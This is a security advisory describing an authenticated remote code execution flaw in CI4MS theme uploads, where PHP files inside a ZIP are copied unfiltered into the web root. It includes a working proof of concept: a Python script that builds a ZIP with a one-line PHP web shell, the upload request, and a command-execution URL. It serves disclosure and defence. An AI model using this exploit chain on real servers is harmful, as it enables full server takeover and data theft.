summary: "CI4MS has Unrestricted PHP File Upload via Theme Installation that Leads to Authenticated\
  \ Remote Code Execution\n### Summary\nA theme upload feature allows any authenticated backend\
  \ user with theme-upload permission to achieve remote code execution (RCE) by uploading a\
  \ crafted ZIP file. PHP files inside the ZIP are installed into the web-accessible public/\
  \ directory with no extension or content filtering, making them directly executable via HTTP.\n\
  \n\n### Details\nFile: `modules/Theme/Controllers/Theme.php`\n\nAfter a ZIP is uploaded and\
  \ extracted to a temporary directory, install_theme_from_tmp() is called unconditionally:\
  \ Theme.php:51-52\n\nFile: `modules/Theme/Helpers/themes_helper.php`\n\nThe helper copies\
  \ every file matching *.* from `public/templates/<name>/` inside the ZIP directly into `public/templates/<name>/`\
  \ on disk using rename(), with no file-extension allowlist, no MIME check, and no content\
  \ inspection: `themes_helper.php:60-68`\n\nBecause the web root is `public/`, any `.php` file\
  \ placed there is directly reachable over HTTP.\n\nPHP files are also installed — without\
  \ filtering — into app/Controllers/templates/<name>/, app/Libraries/templates/<name>/, and\
  \ other app/ subdirectories: `themes_helper.php:31-42`\n\nThe theme name is derived from the\
  \ uploaded filename via `str_replace('_theme.zip', '', $file->getName())`, so uploading `evil_theme.zip`\
  \ sets the theme name to evil and the install target to `public/templates/evil/`: `Theme.php:20`\n\
  \n### PoC\nPrerequisites: A backend account with theme upload permission (e.g., backend/themes/upload).\n\
  \nStep 1 — Build the malicious ZIP:\n```\nimport zipfile, io  \n  \nbuf = io.BytesIO()  \n\
  with zipfile.ZipFile(buf, 'w') as z:  \n    z.writestr('public/templates/evil/shell.php',\
  \ '<?php system($_GET[\"c\"]); ?>')  \nbuf.seek(0)  \nwith open('evil_theme.zip', 'wb') as\
  \ f:  \n    f.write(buf.read())\n```\nStep 2 — Upload:\n```\nPOST /backend/themes/upload \
  \ \nContent-Type: multipart/form-data  \n  \nfield name: theme  \nfile:       evil_theme.zip\
  \  \n```\nStep 3 — Execute:\n```\nGET https://target.com/templates/evil/shell.php?c=id  \n\
  ```\nExpected response: output of id (e.g., uid=33(www-data) gid=33(www-data) groups=33(www-data)).\n\
  \n\n### Impact\nType: Authenticated Remote Code Execution (RCE) via arbitrary file write to\
  \ the web root.\n\nWho is impacted: Any deployment where a backend user has been granted theme\
  \ upload permission. A superadmin already has full access, but any lower-privileged role granted\
  \ this permission can use it to write and execute arbitrary PHP on the server, gaining OS-level\
  \ command execution under the web server process. This can be used for data exfiltration,\
  \ lateral movement, persistence, or full server compromise."
